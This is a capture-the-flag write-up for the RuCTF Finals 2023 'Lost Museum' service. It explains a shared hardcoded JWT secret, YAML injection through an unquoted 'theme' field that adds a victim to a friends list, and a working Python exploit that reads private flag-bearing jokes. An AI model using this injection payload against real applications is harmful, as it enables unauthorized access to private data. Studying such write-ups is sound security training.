# RuCTF Finals 2023 | Lost Museum

## Description

The service is the latest social network to restore the burnt museum of jokes

## You can

1) Add your own jokes (for everyone or just for friends)
2) View your jokes
3) Search for jokes (you will see public jokes, as well as private jokes of those users with whom you are friends)
4) Add friends to other users and add other users to your friends


### Note 0

All teams had the same JWT secret

```go
secret := "HUI"
```

### Note 1
Adding a joke happens through this `yaml`:
```yaml
jokes:
  status: {{ .Status }}
  theme: {{ .Theme }}
  text: "{{ .Text }}"
```

Later this yaml is translated into golang map

The `text` field is enclosed in quotation marks so that line breaks do not break the yaml structure.
But the `theme` field is not in quotation marks.
Accordingly, we can insert any value there containing newlines and break the original structure.

### Note 2

Adding an anecdote goes like this:

```go
res, err := r.col.UpdateOne(ctx, map[string]string{"username": username}, 
                                 map[string]map[string]map[string]string{"$push": joke})
if err != nil {
    return fmt.Errorf("error while adding joke: %w", err)
}
if res.MatchedCount == 0 {
    return common.ErrNotExists
}

return nil
```

The `$push` command iterates over the passed object and adds each key the corresponding value.

In our case, in `joke` we have: `{"jokes": {"status": ..., "theme": ..., "text": ...}}`

### Note 3

Flags are kept in private jokes

To access them you need to become a friend of the user

User 1 considers himself a friend of user 2 if user 2 has user 1 in the `friends` field

Accordingly, you can break the structure of the yaml by adding the desired user as a friend, and then reading his jokes

### Result

Combining it all together, we got sploit:

```python
#!/usr/bin/env python3
import random
import sys
from string import ascii_letters

import requests

HOST = sys.argv[1]
PORT = 18888
PUBLIC_FLAG_ID = sys.argv[2]


def get_random_string() -> str:
    return ''.join(random.choice(ascii_letters) for _ in range(20))


def sploit():
    url = f"http://{HOST}:{PORT}/api"

    username, theme = PUBLIC_FLAG_ID.split("+")

    token = requests.post(f"{url}/register", data={"username": get_random_string(), "password": "123"}).json()["token"]
    headers = {"Authorization": f"Bearer {token}"}

    resp = requests.post(f"{url}/jokes", data={"status": "private",
                                               "theme": f"zzzz\nfriends:\n  {username}: yes\nsome:",
                                               "text": "abacaba"}, headers=headers)

    resp = requests.get(f"{url}/jokes", data={"username": username, "theme": theme}, headers=headers)
    print(resp.text)


if __name__ == '__main__':
    sploit()
```
